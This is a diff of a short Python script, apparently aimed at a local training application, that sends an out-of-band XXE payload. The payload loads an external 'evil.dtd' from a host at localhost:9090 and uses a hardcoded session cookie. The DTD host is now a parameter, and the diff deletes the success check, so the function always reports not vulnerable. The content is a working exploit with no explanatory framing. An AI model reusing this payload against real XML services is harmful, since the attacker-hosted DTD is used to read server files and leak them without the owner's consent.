@@ -6,19 +6,16 @@ import time
 
 
 
-def oob_xxe(site):
+def oob_xxe(url, dtd_file="http://localhost:9090/files/xxexxe/evil.dtd"):
     is_vulnerable = False
     headers = {'Content-Type': 'application/xml'}
     cookies = {'JSESSIONID': 'PZo86PHS-Wh1PZmPeLUfA6T5MYrNo6OQAhVbwVKy'}
-    payload = '''<?xml version="1.0"?>
-    <!DOCTYPE comment SYSTEM "http://localhost:9090/files/xxexxe/evil.dtd">
+    payload = f'''<?xml version="1.0"?>
+    <!DOCTYPE comment SYSTEM "{dtd_file}">
     <comment>
     <text>&get;</text>
     </comment>
     '''
     response = requests.post(url, headers=headers, data=payload, cookies=cookies)
-    if (response.text.find("root") != -1) :
-        print("check your server to see the reseults")
-        is_vulnerable = True
     print(response.text)
     return is_vulnerable
